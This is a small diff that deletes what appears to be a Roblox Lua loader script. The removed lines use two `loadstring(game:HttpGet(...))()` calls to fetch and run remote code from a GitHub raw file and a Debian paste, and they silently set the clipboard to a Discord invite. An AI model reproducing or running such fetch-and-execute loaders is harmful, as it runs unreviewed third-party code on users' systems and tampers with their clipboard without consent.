@@ -1,5 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/hoodratleahh/Summer-UPD/refs/heads/main/Initializer.lua"))()
-
-setclipboard("discord.gg/HsgfV6neRC")
-
-loadstring(game:HttpGet("https://paste.debian.net/plainh/957a0a7b/", true))()
